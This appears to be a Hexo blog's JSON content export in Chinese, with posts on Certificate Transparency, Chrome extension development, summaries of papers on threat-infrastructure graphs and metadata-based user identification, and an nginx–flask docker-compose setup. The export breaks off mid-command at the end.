{"meta":{"title":"o1hy","subtitle":null,"description":null,"author":"o1hy","url":"https://17307.github.io"},"pages":[{"title":"","date":"2019-02-20T11:20:32.795Z","updated":"2019-02-01T13:21:51.000Z","comments":true,"path":"google965c1813510f136f.html","permalink":"https://17307.github.io/google965c1813510f136f.html","excerpt":"","text":"google-site-verification: google965c1813510f136f.html"},{"title":"categories","date":"2019-01-29T16:32:23.000Z","updated":"2019-01-29T16:32:23.000Z","comments":true,"path":"categories/index.html","permalink":"https://17307.github.io/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"HTTPS and Certificate Transparency","slug":"Transparency","date":"2019-02-20T07:53:02.000Z","updated":"2019-02-20T11:41:23.174Z","comments":true,"path":"2019/02/20/Transparency/","link":"","permalink":"https://17307.github.io/2019/02/20/Transparency/","excerpt":"HTTPS ， CA , CT的一些内容","text":"HTTPS ， CA , CT的一些内容 证书的作用HTTPS描述下HTTPS的过程 下图描述了HTTPS的简化的流程，具体每一步的传输的内容：http://www.ruanyifeng.com/blog/2014/02/ssl_tls.html 证书验证机制 当用户拿到了站点的证书后，要去验证这个证书的有效性。所以要去验证该证书的颁发者。 找到证书颁发者后（中间CA），要去验证这个颁发者的有效性。 找到中间CA的 根证书 颁发机构证书。 最终确定证书可用性，继续通信 客户端是是如何验证某个证书的有效性证书颁发者一般提供两种方式来验证证书的有效性： CRL 和 OCSP。 CRL（Certificate Revocation List）即 证书撤销名单。证书颁发者会提供一份已经失效证书的名单，供浏览器验证证书使用。浏览器会缓存 CRL 。一段时间更新一次。 OCSP(Online Certificate StatusProtocol) 即 在线证书状态协议。 除了 CRL，证书颁发者也会提供实时的查询接口，查询某个特定证书目前是否有效。实时查询的问题在于浏览器需要等待这个查询结束才能继续TLS握手，延迟会更大。 下面的内容，是对某blog的文章翻译和自己的理解，讲了CT，以及CT该如何用。文章分为3部分，每部分的原文链接已给出。 Certificate Transparency — The bright side and The dark side原文连接：https://blog.appsecco.com/certificate-transparency-the-bright-side-and-the-dark-side-8aa47d9a6616 part 1什么是Certificate Transparency证书透明项目(Certificate Transparency project，简称CT)旨在记录、审计和监视证书颁发机构(CA)颁发的证书。这个项目的主要目的是防止ca在域所有者不知情的情况下为域颁发公钥证书。 下面是一些术语 Certificate Authority 证书颁发机构(CA)是颁发数字证书的实体。CA是受信任的第三方，由数字证书的所有者和依赖证书的一方信任。因此，CAs在Internet如何运行以及如何透明、可信地进行事务方面发挥着关键作用。 Digital Certificates 数字证书是可验证的小型数据文件，其中包含身份凭证，以帮助网站、个人和设备代表其真实的在线身份。在本文的上下文中，我们关心SSL/TLS证书，这是一种将web服务器的所有权细节绑定到加密密钥的数字证书。 Why did Google come up with Certificate Transparency?起因：google发现了自己家的域名被CA私自颁发了证书 Certificate Transparency — Where is it now?CT现在是一个互联网工程工作组(IETF)的开放标准，用于监控和审计此类数字证书。CT通过一个认证日志、监控和审计系统，允许网站用户和域名所有者识别错误或恶意颁发的证书。这有助识别未经授权的核证机关。 part 2原文连接：https://blog.appsecco.com/certificate-transparency-part-2-the-bright-side-c0b99ebf31a8 The problem Certificate Transparency is trying to solve公钥基础设施(Public Key Infrastructure, PKI)是一个框架，用于在可能从未谋面的各方之间实现安全通信。PKI模式依赖于：信任证书颁发机构(CAs)的第三方。CAs负责签发数码证书。SSL/TLS PKI依赖于：分层CA信任模型，叫做：certification hierarchy CA颁发证书模型 根CA位于证书层次结构的顶部，根CA是“自签名的”。大多数应用程序/设备都带有一组预先加载到其根存储中的根证书，根存储实际上是已批准的ca的数据库 中间CA是信任链中的第一个环节。中间证书通常由根证书签名。如果中间CA受到攻击，来自其他中间CA的证书仍然有效 用户是希望通过internet安全提供服务并需要SSL/TLS证书的任何人 CT要做的就是防止流氓证书 Can Certificate Transparency deal with the rogue certificates?在CT下，CA必须将其发出的每个SSL/TLS证书发布到公共日志中。目前已知的CT日志的详细信息可以在CT project页面上找到。任何人都可以通过这些日志查找为任何给定域颁发的SSL/TLS证书。 域所有者可以简单地监视针对其管理的域颁发的证书的公共CT日志，并识别流氓证书。 通过提供一种查找所有SSL/TLS证书的方法，CT帮助我们在野外识别流氓证书，并找出哪个CA颁发了流氓证书。这使得诸如谷歌、Mozilla等浏览器制造商能够对ca错误采取行动。 How do I lookup certificates issued for my domain?查找为您的域颁发的证书的最简单方法是使用收集CT日志的搜索引擎，并让任何人搜索它们。下面列出了一些流行的方法 https://crt.sh/ https://censys.io/ https://developers.facebook.com/tools/ct/ https://google.com/transparencyreport/https/ct/ The state of Certificate Transparency adoption到目前为止，CT受到了积极的欢迎，其使用率正在上升。 这些 Let’s encrypt, Digicert, Symantec, Comodo CA都在积极的这么做 像Mozilla Firefox和谷歌Chrome这样的主流浏览器都实现了CT Facebook不仅倡导CT，还发布了一个证书透明监控工具。使用此工具，您可以搜索为域颁发的证书，并在为域颁发新证书时通过电子邮件得到通知。 从2018年4月起，Chrome将强制所有新证书使用CT。Chrome对CT的支持要求CAs记录Chrome中出现的绿色地址栏的所有扩展验证(EV) SSL证书。 Chrome还致力于实现一个新的HTTP头，expect-ct，它将允许服务器操作人员在CT被授权之前测试他们的配置和证书。 ConclusionCT是提高SSL / TLS PKI生态系统安全性的重要一步。 CT正在整个行业中得到采用和实施，这是一个积极的信号。 如果越来越多的CA落后于CT，整个SSL / TLS生态系统就变得越透明和安全。 Part 3原文连接：https://blog.appsecco.com/certificate-transparency-part-3-the-dark-side-9d401809b025 The side effect of Certificate TransparencyCT日志按设计包含由参与CA为任何给定域颁发的所有证书。这些日志是公开的，任何人都可以查看这些日志。 SSL/TLS证书通常包含域名、子域名和电子邮件地址。这使得它们成为攻击者的信息宝库。 通过查看CT日志，攻击者可以收集关于组织基础设施的大量信息，如内部域、电子邮件地址。 Let’s look at how attackers look through Certificate Transparency logs下面是一些搜索引擎，可以用来搜索CT日志 https://crt.sh/ https://censys.io/ https://developers.facebook.com/tools/ct/ https://www.google.com/transparencyreport/https/ct/ Attacking Content Management Systems using Certificate Transparency在设置Wordpress、Joomla等流行的内容管理系统(CMSs)时，有一个时间窗口，安装程序没有任何形式的身份验证。现在，许多web托管提供商默认支持HTTPS，因此域名最终将出现在CT日志中，这取决于CA，这可能发生在接近实时的情况下，或者有几个小时的延迟。如果攻击者可以通过CT日志搜索并在没有身份验证的情况下找到这样的web应用程序，那么他/她就可以接管服务器。 对上面这段话进行下解释：在安装CMS时候，如果在安装过程中被攻击者发现域名，那么攻击者可以接手这个安装进程，好像如此。 How can you secure your domains now? 您可以避免使用SSL/TLS支持，这样您的内部主机就不会出现在CT日志中。这种方法绝对不推荐。如果您正在处理敏感信息，那么不使用SSL/TLS不是一个好主意 通过使用通配符证书，您可以拥有对所有子域有效的单个证书，从而不会在CT日志中显示子域名。使用一个通配符证书来保护多个域可能被证明是单点故障，因此不建议使用。 接受这样一个事实:所有SSL/TLS受保护的域/子域将在公共CT日志文件中列出。更好地保护服务器和应用程序端点。任何不打算公开的内容都必须在身份验证之后。 您可以在组织中部署自己的公钥基础设施(PKI)。这将避免您的内部主机出现在由公共CA维护的CT日志中 CloudFlare有一个有趣的项目CFSSL，用于构建内部CA基础设施。他们还有一个项目certmgr，可以使用CFSSL自动化证书管理 一些ca为客户提供了一个选择，让他们选择不使用CT日志。选择退出CT日志可能听起来是一个安全的主意，但是您将错过CT提供的所有安全好处 考虑从CT日志中编辑子域信息。如果您的CA支持名称编校，那么您可以选择将子域信息隐藏在CT日志中。尽管名字修订比退出CT要好，但它仍然会使您难以跟踪伪造的证书。修改后的域名将不会被Chrome识别为符合CT政策 结语虽然CT是一个非常棒的想法，但它也存在一些重大的隐私和安全风险，但是考虑到CT在解决恶意证书这一由来已久的问题方面所提供的优势，我们认为采用CT作为安全机制是一种公平的权衡。","categories":[{"name":"PT","slug":"PT","permalink":"https://17307.github.io/categories/PT/"}],"tags":[]},{"title":"chrome-extension","slug":"chrome-extension","date":"2019-02-02T13:50:15.000Z","updated":"2019-02-14T11:33:28.165Z","comments":true,"path":"2019/02/02/chrome-extension/","link":"","permalink":"https://17307.github.io/2019/02/02/chrome-extension/","excerpt":"本文将介绍一些chrome插件的基础内容，但是也省略了一些基础的内容。并不面向新手开发者。文中将会对content-js,inject-js,popup,background做一些粗略的介绍，尤其是对它们之间的通信方面。","text":"本文将介绍一些chrome插件的基础内容，但是也省略了一些基础的内容。并不面向新手开发者。文中将会对content-js,inject-js,popup,background做一些粗略的介绍，尤其是对它们之间的通信方面。 核心介绍manifest.json首先是manifest.json,这是一个Chrome插件最重要也是必不可少的文件，用来配置所有和插件相关的配置，必须放在根目录。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&#123; // 清单文件的版本，这个必须写，而且必须是2 \"manifest_version\": 2, // 插件的名称 \"name\": \"demo\", // 插件的版本 \"version\": \"1.0.0\", // 插件描述 \"description\": \"简单的Chrome扩展demo\", // 图标，全部用一个尺寸的也没问题 \"icons\": &#123; \"16\": \"img/icon.png\", \"48\": \"img/icon.png\", \"128\": \"img/icon.png\" &#125;, // 会一直常驻的后台JS或后台页面 \"background\": &#123; // 2种指定方式，如果指定JS，那么会自动生成一个背景页 \"page\": \"background.html\" //\"scripts\": [\"js/background.js\"] &#125;, // 浏览器右上角图标设置，browser_action、page_action、app必须三选一 \"browser_action\": &#123; \"default_icon\": \"img/icon.png\", // 图标悬停时的标题，可选 \"default_title\": \"这是一个示例Chrome插件\", //点击后，弹出的页面 \"default_popup\": \"popup.html\" &#125;, // content - js \"content_scripts\": [ &#123; //\"matches\": [\"http://*/*\", \"https://*/*\"],可以用正则匹配 // \"&lt;all_urls&gt;\" 表示匹配所有地址 \"matches\": [\"&lt;all_urls&gt;\"], // 多个JS按顺序注入 \"js\": [\"js/jquery-1.8.3.js\", \"js/content-script.js\"], // css \"css\": [\"css/custom.css\"], // 代码注入的时间，可选值： //\"document_start\"页面记载前, //\"document_end\"页面记载后, //or \"document_idle\"，最后一个表示页面空闲时，默认document_idle \"run_at\": \"document_start\" &#125;, // 多个 content_javascripts规则 &#123; \"matches\": [\"*://*/*.png\"], \"js\": [\"js/show-image-content-size.js\"] &#125; ], // inject-js注入的需求配置 \"web_accessible_resources\": [\"js/inject.js\"], // 权限申请 \"permissions\": [ \"contextMenus\", // 右键菜单 \"tabs\", // 标签 \"notifications\", // 通知 \"webRequest\", // web请求 \"webRequestBlocking\", \"storage\", // 插件本地存储 \"http://*/*\", // 跨域 \"https://*/*\" // 跨域 ],&#125; 四个核心内容本文给出的四个核心内容为：content-js,inject-js,popup,background。下面将会做一些个人的理解介绍。 popuppopup是点击插件后，弹出来的小页面，当点击那个小按钮的时候，popup.html将会调用。同时包含在popup.html中的js文件也会被运行。popup.html无法直接写js脚本，必须通过包含的方式来写。 content-jscontent-js是Chrome插件中向页面注入脚本的一种形式，会根据配置文件中指定的时间加载。 content_scripts中的脚本只是共享页面的DOM，而并不共享页面内嵌JavaScript的命名空间。也就是说，如果当前页面中的JavaScript有一个全局变量a，content_scripts中注入的脚本也可以有一个全局变量a，两者不会相互干扰。当然你也无法通过content_scripts访问到页面本身内嵌JavaScript的变量和函数。(http://www.ituring.com.cn/book/miniarticle/60212) inject-jsinject-js与原生页面的js没有差别，因为inject-js就是将js代码注入到正在执行的Web页面中。它的实现方式是：先写一个js的文件，然后在content-js通过如下的类似代码，将写好的js文件注入到网页中。 123456//某个content-js页面var s = document.createElement('script');//提前写好的js脚本s.src = chrome.extension.getURL('inject.js');(document.head || document.body).appendChild(s);# 同时你要注入的inject.js需要在manifest中的web_accessible_resources字段里进行声明,看上面的配置文件 关于上面提到的content-js和inject-js的区别和联系，inject-js在content-js中进行注入。inject-js都可以获取web页面中的js的变量内容，而content-js不可以。 backgroundbackground是在页面打开后就一直运行的文件，可以理解为插件和页面的枢纽。 通信关于这些组件的通信有四种: content-js与inject-js的通信 background与content-js的通信 background与popup.js的通信 popup与content-js的通信 四种通信方式的整体思想一致。接收方使用监听函数，发送发使用发送函数。 content-js 与 inject-jsdemo 123456789101112131415161718192021222324252627282930313233//inject.jsf = document.getElementById('sb_form_go');f.onclick = function()&#123; var message = document.getElementById('sb_form_q'); window.postMessage(&#123;'message':message.value&#125;, '*'); return false;&#125;//main.js//注入jsfunction injectCustomJs(jsPath)&#123; console.log('@@@@@@@@'); jsPath = jsPath || 'js/inject.js'; var temp = document.createElement('script'); temp.setAttribute('type', 'text/javascript'); // 获得的地址类似：chrome-extension://ihcokhadfjfchaeagdoclpnjdiokfakg/js/inject.js temp.src = chrome.extension.getURL(jsPath); // console.log(document) document.body.append(temp);&#125;console.log('11111111111111111111');//接收消息window.addEventListener(\"message\", function(e)&#123; console.log(e.data);&#125;, false);injectCustomJs() others另外的三种通信模式如下： 同时在这三种接收方式中使用的监听函数相同 1234567chrome.extension.onMessage.addListener(function(message,sender,callback)&#123; //message为收到的消息 //sender是发送者的信息 //callback是回调函数，执行后会调用发送方的回调函数 console.log(message)； callback('执行成功')；&#125;); 然后就是发送函数，对于发送函数可以分为两种，一种是向插件中的组件发送内容，另一种是向web页面发送内容。向web页面发送内容，实质就是发送到content-js中。这两种发送的函数不同，分别为：chrome.runtime.sendMessag,chrome.tabs.sendMessage 1234567891011chrome.tabs.query(&#123;active: true, currentWindow: true&#125;, function(tabs) &#123; chrome.tabs.sendMessage(tabs[0].id, message, function(response) &#123; if(callback) callback(response); &#125;); &#125;);chrome.runtime.sendMessage(&#123;greeting: '你好，我是content-script呀，我主动发消息给后台！'&#125;, function(response) &#123; console.log('收到来自后台的回复：' + response);&#125;); 下面给出一个demo","categories":[{"name":"others","slug":"others","permalink":"https://17307.github.io/categories/others/"},{"name":"chrome","slug":"others/chrome","permalink":"https://17307.github.io/categories/others/chrome/"}],"tags":[{"name":"chrome","slug":"chrome","permalink":"https://17307.github.io/tags/chrome/"}]},{"title":"Graph-theoretic characterization of cyber-threat infrastructures","slug":"infrastructures","date":"2018-11-12T08:30:45.000Z","updated":"2019-02-02T11:52:17.000Z","comments":true,"path":"2018/11/12/infrastructures/","link":"","permalink":"https://17307.github.io/2018/11/12/infrastructures/","excerpt":"","text":"0x00 基本信息作者: o1hy@DAS原文作者： Amine Boukhtouta, Djedjiga Mouheb , Mourad Debbabi ,Omar Alfandi, Farkhund Iqbal, May El Barachi原文标题： Graph-theoretic characterization of cyber-threat infrastructures原文会议或期刊： Digital Investigation(网络中与犯罪和安全有关的主题) 论文主要内容： 与网络威胁相关的基础设施的分析0x01 文章摘要本文对网络威胁及其基础设施进行了研究。 检测和分析网络威胁基础设施，揭示关键参与者(所有者、域、ip、组织、恶意软件家族等)以及这些参与者之间的关系。 对这些基础设施共享进行量化，以揭示特定攻击背后的潜在群体。 研究了网络威胁基础设施的演变，以推断网络犯罪活动的模式。 0x02 背景提出要解决的问题 网络威胁基础设施的要素（域名/IP，域名反查到的组织/注册商等信息） 及 其相互关系是什么 网络罪犯用于实施攻击的基础设施是什么 对于注册恶意域和IP地址的联系人而言，组织和人员中最重要的参与者是谁 这些恶意软件的基础设施的发展模式 基于上述的这些问题，本文提出的解决思路为：关联分析不同来源的恶意软件的基础要素，包括域名/IP，域名反查到的组织/注册商等信息。运用图论概念进行分析。 0x03 解决方法整体流程: (1)数据收集、(2)网络威胁图生成、(3)统计特征、(4)图概念下的评分、(5)推断基础设施的演变模式 数据收集数据来源： https://www.threattrack.com/ 收集过程： 通过沙箱获得报告 获得这些被访问的域名，连接的IP 通过VirusTotal获得恶意软件家族信息 使用Whois获得 域名和IP的相关信息，如：注册人，组织，物理地址等 生成威胁图威胁图的组件malware, domains, IP addresses, FTP servers, SMTP servers, IRC channels, timestamps, organizations, registrars, technical people,administrative people and domain owners 生成有向图红色顶点代表恶意软件，黄色顶点代表IP，绿色顶点代表注册商等信息。 随着时间增长，这个图会超级复杂。 他提出如下概念，将异构有向图分析额为同构的有向图。 被恶意软件共享的域名相连接。假设有两个恶意软件 v_1 和 v_2 他们都连到了2个域名下：v_d1 和 v_d2。那么就把 v_d1和v_d2相连。图分解会产生如下的几个子图： Domain-Malware graph：被恶意软件共享的域名被链接 Domain-IP graph： 相同IP的域名 IP-Malware graph： 被恶意软件连接的IP 链接起来 Owner-Malware graph： 被恶意软件访问到的域名的拥有者被链接 Owner-Physical address graph： 它们用相同的物理地址注册不同的域名的拥有者被链接 Organization-Malware graph： 被恶意软件访问的IP的组织 图概念下的评分本文为了评估不同参与者在网络威胁基础设施中的重要性或影响，结合一些原因，最终选择了page rank算法。 $$PR(v_i) =d[\\sum_{v_j\\in I(v_i)}\\frac{PR(v_j)}{deg_{out}(v_i)}]+(1-d)\\frac{1}{|d|}$$其中 I(v_i) 是顶点集。deg_{out}(v_i)是顶点的外度中心。d是阻尼因子，（经常被假定为0.85）。他会对这个式子做一些变化……求值。 原因 page rank反映了模型演化过程中的随机性。因为随着时间的变化，基础设施也是在变的。 page rank是用来描述用户浏览网页的算法。而一个恶意软件访问那些基础设施（域名、IP）等，这2中情况很相似。 This algorithm has been developed intuitively considering a user surfing the Web, starting from a web page and randomly visiting another web page through a link. If the user is on page vj with a probability d (damping factor), then the probability for this user to visit another page vi is equal to 1/deg_{out}(v_j). With a probability of 1-d, the user will stop following links and pick another random page in V. 模式识别目的本文提出的解决的问题中有一个为：判断恶意软件的基础设施的发展模式。本文在此部分研究了：网络威胁基础设施如何随时间演变。通过分离生成的图中可见的模式来识别这些基础设施中可识别的规则和不规则性。为了推断图形，我们计算每天收集的图形之间的相似性。 计算关联性为了计算图之间的关联性，它使用的方法为：graph kernels 。graph kernels 是使用线性方法计算图之间相似性的函数。然而，对于大型图来说，图核方法生成的向量具有高维，不容易处理。为了解决这个问题，图形核方法需要一个重要的过程称为计算图的指纹。 指纹生成的过程包括三步：1. 分解 2. 生成向量 3. 计算指纹 通过指纹计算关联性 基于时间的模式推断 Generating Vectors 本质：把每一个分解后的子图变成一个整数。看第三行。其中的α是随机数，P是一个大质数，L(v_i,v_j)，返回的是共享了v_i和v_j的恶意软件数量。 L is the labelling function that returns the number of malware shared between vi and vj 计算指纹 由图子结构生成的向量对于大型图可能具有高维性。为了减小矢量的维数，我们使用指纹技术来生成易于处理的紧凑表示。 不是很了解h函数返回的是什么。 Teixeira CHC, Silva A, Meira Jr W. Min-hash fingerprints for graph kernels: a trade-off among accuracy, efficiency, and compression. JIDM 2012;3(3): 227e42. https://seer.lcc.ufmg.br/index.php/jidm/article/view/199. 通过指纹计算关联性 计算方式：指纹中相同的个数/总数 Graph similarities are represented through a matrix, where each value is proportional to the number of values, in the min-hash vectors, that are shared between graph pairs (Fig. 6). This matrix is important for grouping graphs with proportional similarities into groups that can be good candidates to detect patterns between corresponding minhash values. 基于时间的模式推断 得到的模式 0x04实验结果实验结果分为了三部分，分别是统计特征，badness scores排序，模式推断 隐私保护 For domain names, we remove some characters at the beginning or at the middle of domain names and replace them with “ ”character. For IP addresses, we replace some digits with “x” character. Regarding organizations, for each country, we replace organization names with indexed codes; for example, ORG1(CHINA)-GD represents an organization which has a network located in China, Guangdong city. For owners, we replace names with initials. For physical addresses, we mask some digits and letters with “ ” character. 数据集域名做了过滤，没有包含Alexa中前100W的名单 统计特征Domains &amp; resolving IPstop10个经常被恶意软件访问的域名。其中有5个合法的.原因：恶意软件样本倾向于通过访问合法的域或将对合法域的访问重定向到虚假网页来测试连接；恶意软件还连接到合法的域，下载操作系统或软件的漏洞补丁，利用漏洞进行恶意活动。 top-10 fast-fluxing domains(可以解析成多个IP的域名)分析大部分具有相同的二级域名 nb**,恶意软件广泛使用fast-flux和动态生成的域名 域名被解析后分布最多的ip空间分析表中可以看出184和216两个空间是最多的： 公共IP空间的存在暗示着网络罪犯很容易使用IP基础设施进行恶意活动，或者感染脆弱的IP空间，让他们成为僵尸网络的一部分 通过关联分析发现 解析为184.1xx.xxx.x6的域名为动态生成的域，都有于同一个二级域名 *eker.com 拥有这些IP的组织。 Connected IPstop-10 恶意软件链接的IP。分析这些IP来自不同的IP空间经常和VPN有联系。 IP对应的top10的 network name。分析 10个中8个为亚洲的。其中9个属于组织，3个是中国的，2个韩国，2个美国。排名第一是马来西亚的。 Whois information注册商与域名的对应信息。分析可以发现，大部分都是那种隐私保护的注册商。 域名和物理地址的对应。分析排名第一的是一个巴拿马的地址，这个地址会提供一些隐私保护的服务。 Badness rankingtop10-域名的badness scores。分析7个有 .ru，这7个中，5个有相同注册信息，关联了830个恶意软件，许多恶意软件家族都和这些域名有联系。 top10-链接ip的badness scores分析 排名第一的与table6中的相同，同时2个表还有一些其他相同的IP。 其中存在一个组播IP，239.255.255.250,windows服务中存在一个漏洞，可以让这些恶意软件通过SSDP协议作为感染载体。 前5个领域和连接ip的坏分数的演变,域名具有周期性,IP更分散。 圈越大，分越高。 Patterns inference分析通过这两个图可以发现，域名的相似性更具有周期性。而IP的周期性很短，1-60天。 域名的模式：2个字母+2个数字。分析这些域名下存在大量的恶意软件，并且这些域名的拥有着都有隐私保护，美国一些有这种服务的域名公司很可疑。恶意软件连接IP的模式。分析这些IP5个属于中国。中国有一个IP模式集群，协作恶意软件活动。 0x05总结与贡献 定义了网络威胁基础设施的不同元素及其关系，提出了研究这些关系的方法。 确定了这些元素中的重要参与者。 找到了不同恶意软件共享的基础设施。 找到了基础设施的演变模式。","categories":[{"name":"papers","slug":"papers","permalink":"https://17307.github.io/categories/papers/"}],"tags":[]},{"title":"Identifying People by Metadata","slug":"Metadata","date":"2018-10-28T02:55:15.000Z","updated":"2019-02-04T10:40:43.000Z","comments":true,"path":"2018/10/28/Metadata/","link":"","permalink":"https://17307.github.io/2018/10/28/Metadata/","excerpt":"Identifying People by Metadata","text":"Identifying People by Metadata 0x00 基本信息作者: o1hy@DAS原文作者： Beatrice Perez, Mirco Musolesi, and Gianluca Stringhini原文标题： You are your Metadata: Identification and Obfuscation of Social Media Users using Metadata Information原文会议或期刊： ICWSM2018（交叉型学科会议，人文科学社交网络）原文链接： https://www.ucl.ac.uk/~ucfamus/papers/icwsm18.pdf论文主要内容： 讨论元数据与隐私,以及报保护元数据 0x01 文章解读问题提出通常,人们关心的多为内容的安全,而信息的元数据被认为是不那么重要的.用户也通常不会在意对元数据的保护.一些厂商甚至会去收集用户的元数据,并告知用户,这不会侵犯他们的个人隐私.文章中,讨论了元数据到底会不会侵犯一个人的隐私.以及该怎么保护这些元数据. 文章结构第一部分作者以推特数据为实验数据,通过构造不同的特征,并且用了三种不同的机器学习算法通过这些特征识别用户,来验证保护元数据的重要性. 第二部分作者通过两种方法来混淆,隐藏元数据,然后重新进行检测.用来验证元数据能否被保护. 模型设计检测模型用户集合 $$U = {u_1,u_2,…,u_k,..,u_M}$$ 每一个用户,都可以被一组特征标识. $$X^{u_k} = {x^{u_k}_1,x^{u_k}_2,…,x^{u_k}_R}$$ 所以可以认为,有M个用户,每一个用户都可以被唯一的特征锁标识,所以我们的目标就是在特征集合I中识别出具体的用户. $$I = {i_1,i_2,…,i_M}$$ 所以最后的识别公式为 $$P_I(u_k) = {p_{i_1}(u_k),p_{i_2}(u_k),…,p_{i_M}(u_k)}$$ 识别的结果为: $$max_{i_l}{p_{i_l}(u_k)}$$ 本文认为,每一个用户都会有一组唯一的特征,所以可以根据这组特征来识别不同的用户. 元数据保护模型本文采用了两种方法混淆元数据,一种是: data anonymization ,另一种是: data randomization .文章主要使用了==data anonymization==的方式进行对元数据的混淆和检测. data anonymization数据匿名化是由其中列的值被分为不同的类别的过程中，并且每个读取是通过其相应的类别的索引代替。 data randomization数据随机化是根据一些预定函数改变每列中的数据点的子集的值的技术。简单的来讲,对于每一个账户,又会有一个用户创建时间(ACT),这个时间会的形式是 年:月:日:时:分:秒,例如:2001:3:20:12:21:30.通过数据匿名的方式,这个时间会变成:2001年三月份 实验数据通过 Twitter Streaming Public API (Twitter, Inc. 2018) 随机的选取了 151,215,987条数据,涵盖了11,668,319个用户.但是最后的使用的用户集仅采用了发过的推文多于200的用户:5,412,693位用户. 实验步骤用户识别特征选取对于一个账户而言,元数据的特征有很多.每一个账户的元数据包含了144个字段.这些字段提供的信息包括很多.所选择的特征是那些描述用户帐户并且不受用户直接控制的特征，但被排除的帐户ID除外，因为它被用作每个观察的基本事实(标签).最后选择出的单个特征如下表. 特征 描述 Account creation 账户创建时间 Favourites count 用户标记⭐的数量 Follower count 用户的关注的人数 Friend count 朋友数量 Geo enabled (boolean)指示此帐户的推文是否已进行地理标记 Listed count 包含该帐户的公共列表的数量 Post time stamp 推文发送时间 Statuses count 账户发送的推文的数量 Verified 有没有被官方认证 文章中选择的特征包括:单一特征和不同的特征组合.在这些特征中有静态特征和动态特征 算法选择文章选择了三种机器学习算法:随机森林,K邻近,逻辑回归.随机森林选择了信息熵作为节点分割标准,K邻近选择欧氏距离作为具体计算方式.逻辑回归选择了limited-memory每个分类器的内部参数的优化是作为现场最佳实践和实验结果的组合进行的其中我们使用scikit-learn提供的交叉验证通过将相同的特征或者特征组分别用这三种方法去训练,然后验证准确率. 结果通过上一步证明,得到结论:元数据可以标识用户身份.并将扰乱元数据后,个人身份依然可以被识别出来.下面是文章在实验过程中，对于不同推文的各种特征选择的算法结果。 single feature combination 随着增加的用户 每个用户观察的推文数量 单一属性的熵 动态属性 动静混合-特征 机器学习比较 多特征结果 混淆后的检测 0x02 分析 [x] 本文有一个大的前提背景，就是，这个模型应用在黑客攻击时使用。所以关于 twiter的用户数量以及推文数量和获取的元数据的类型都是有一定范围的。 [x] 本文提出的观点可以用于不同社交系统间的使用. [ ] 动态特征到底对用户识别的贡献有多大影响;或者说,动态特征例如:用户的粉丝,是否真的可以作为用于区分用户身份的特征;或者如何操作。几个数量之间的变换或者很短时间内（1，2天）可以继续识别，假如过了一个月或者更久。 [ ] data anonymization 方式的扰乱数据,会创造出新的元数据,索引表.","categories":[{"name":"papers","slug":"papers","permalink":"https://17307.github.io/categories/papers/"}],"tags":[{"name":"metadata","slug":"metadata","permalink":"https://17307.github.io/tags/metadata/"}]},{"title":"nginx-flask","slug":"nginx-flask","date":"2018-10-28T02:48:58.000Z","updated":"2019-02-02T11:52:17.000Z","comments":true,"path":"2018/10/28/nginx-flask/","link":"","permalink":"https://17307.github.io/2018/10/28/nginx-flask/","excerpt":"","text":"一些思考什么时候会用到compose我有了这样的一个想法：我想创建两个镜像，一个安装nginx，另一个安装python(flask),然后使用这2个容器做web服务，但是我发现我不会写。所以我去查阅compose的各种资料。我发现常常遇到的例子都是，一个web服务器配上一个数据库的服务器。如下： 123456789101112131415161718192021222324252627version: &quot;3&quot;services: db: image: mysql:5.7 volumes: - db_data:/var/lib/mysql restart: always environment: MYSQL_ROOT_PASSWORD: somewordpress MYSQL_DATABASE: wordpress MYSQL_USER: wordpress MYSQL_PASSWORD: wordpress wordpress: depends_on: - db image: wordpress:latest ports: - &quot;8000:80&quot; restart: always environment: WORDPRESS_DB_HOST: db:3306 WORDPRESS_DB_USER: wordpress WORDPRESS_DB_PASSWORD: wordpressvolumes: db_data: 在wordpress的environment中，指定了数据库为：db：3306，这个会被解析成db容器的ip:3306。出现上面的原因，是因为在wordpress容器中使用了depends_on，当然也可以使用link方法。关于depends_on和link的大概为：通过打开端口，以及一些环境变量与另一个容器进行通信。 当然，除了上面两种方法，还可以用另一种方法，在下面将介绍到。 所以，nginx与flask之间的结合，到底适不适合使用docker-compose通信。然而，我并没有找到这个问题的答案，那就先看看它到底能不能使用docker-compose通信吧。 实现思路 拖一个python的镜像，在python中安装相应的包：flask,uwsgi。然后配置好这些东西，通过uwsgi开启flask，监听端口0.0.0.0:5000。 拖一个nginx的镜像，修改配置文件nginx.conf。在这里，最主要的地方就是如何在proxy_pass中，填入正确的 flask容器的ip。 12345678910111213#nginx.confhttp &#123; server &#123; listen 80; server_name 0.0.0.0; location / &#123; proxy_pass http://172.17.0.2:5000; &#125; &#125;&#125;events &#123; worker_connections 1024; ## Default: 1024&#125; 方法一为了解决上面2中的问题，当然可以先启动flask的容器，然后通过命令获得次容器的ip。12345docker inspect &lt;id&gt; | grep IPAddredocker inspect --format '&#123;&#123; .NetworkSettings.IPAddress &#125;&#125;' &lt;container-ID&gt; # 查看所有容器ipdocker inspect --format='&#123;&#123;.NetworkSettings.IPAddress&#125;&#125;' $(docker ps -a -q) 获得上面的ip后，可以通过手工添加到上面的配置文件中。但是docker一个最大的优点就是自动化部署，如果通过这种方法，就显得太蠢了。 方法二通过 docker-compose实现 工程目录 flask搭建Dockerfile12345678910FROM python:3RUN pip install uwsgi &amp;&amp;\\ pip install flask &amp;&amp;\\ mkdir /dataEXPOSE 5000COPY ./app.py /dataCOPY ./uwsgi.ini /dataWORKDIR /dataCMD [&quot;uwsgi&quot;,&quot;uwsgi.ini&quot;] app.py1234567from flask import Flaskapp = Flask(__name__)@app.route('/')def index(): return \"&lt;span style='color:red'&gt;Hello World !&lt;/span&gt;\" uwsgi.ini123456789#uwsgi.ini[uwsgi]socket = 0.0.0.0:5000#protocol = httpchdir = /data/wsgi-file = /data/app.pycallable = appprocesses = 4threads = 2 nginxnginx.conf123456789101112http &#123; server &#123; listen 80; server_name 0.0.0.0; location / &#123; proxy_pass http://$&#123;TEST_PATH&#125;:5000; &#125; &#125;&#125;events &#123; worker_connections 1024; ## Default: 1024&#125; 为了解决刚才提到的问题，可以看到，这里写的是 http://${TEST_PATH}:5000,其中的${TEST_PATH}是系统的环境变量。那么问题就是，如何取到这个环境变量了。下面将介绍。 docker-compose.xml123456789101112131415161718192021version: &quot;3&quot;services: flask: build: ./flask/ restart: always container_name: flask nginx: image: nginx # 或者 # link: flask depends_on: flask environment: TEST_PATH : flask container_name: nginx ports: - 80:80 volumes: - /root/t/nginx/nginx.conf:/1.conf command: /bin/bash -c &quot;envsubst &lt; /1.conf &gt; 